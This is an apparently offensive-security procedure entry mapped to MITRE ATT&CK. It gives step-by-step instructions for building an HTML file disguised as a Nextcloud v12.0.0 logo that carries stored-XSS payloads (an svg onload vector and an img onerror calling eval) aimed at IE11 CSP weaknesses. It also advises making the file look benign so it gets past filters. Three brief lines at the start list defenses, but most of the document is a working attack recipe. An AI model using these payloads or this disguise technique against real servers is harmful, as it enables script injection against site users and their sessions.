---
id: proc-nextcloud-payload-creation-231524
tags:
  - xss-payload
  - html-injection
  - javascript
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:16:13.876Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Create-Malicious-HTML-Payload-for-Nextcloud-Logo

## Summary

This procedure involves crafting a malicious HTML file disguised as a logo image, embedding JavaScript payloads that exploit CSP weaknesses in IE11 to achieve stored XSS when rendered.

## Description

In the context of Nextcloud v12.0.0, the logo upload lacks validation, allowing HTML uploads. The payload includes visible content like a heading and text for legitimacy, plus XSS vectors using SVG onload and img onerror attributes. These bypass the basic CSP by leveraging IE11's parsing quirks, enabling JS execution only in vulnerable IE11 versions on Windows 7, 10, and Windows Phone 8.1. This step prepares the file for upload, setting up the stored injection.

## Requirements

1. Text editor (e.g., Notepad, Vim) to write HTML.
2. Basic knowledge of HTML and JavaScript for crafting payloads.
3. Target: Any system for file creation; no network access needed yet.

## Defense

Defensive measures and detection strategies:

- Implement client-side payload scanners in upload interfaces.
- Enforce strict MIME type checking and file extension validation on uploads.
- Monitor for anomalous file uploads by admins via logs.

## Objectives

1. Generate a functional HTML payload that renders harmlessly but executes JS in IE11.
2. Ensure payloads are CSP-bypassing and browser-specific.
3. Prepare file for seamless upload without triggering basic filters.

## Instructions

### Step 1: Draft Basic HTML Structure

**Context**: Start with a simple HTML skeleton to mimic a logo while embedding explanatory text.

Create a file named `logo.html` with the following content:

```html
<!DOCTYPE html>
<html>
<head><title>Logo</title></head>
<body>
<h1>The logo!</h1>
<p>This is the new site logo with embedded functionality.</p>
</body>
</html>
```

> This establishes a benign appearance; save the file.

### Step 2: Embed XSS Payloads

**Context**: Add JavaScript vectors that trigger on load or error, targeting IE11's lenient parsing.

Append the following to the `<body>` in `logo.html`:

```html
<svg/onload=alert('SVG')></svg>
<img id="alert('image XSS')" alt="/" src="/" onerror=eval(id)>
```

> The SVG uses onload to alert; the img uses onerror with eval on an ID containing JS code. Test by opening in IE11 (expect alert); no execution in other browsers.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[xss-payload]]
- [[html-injection]]
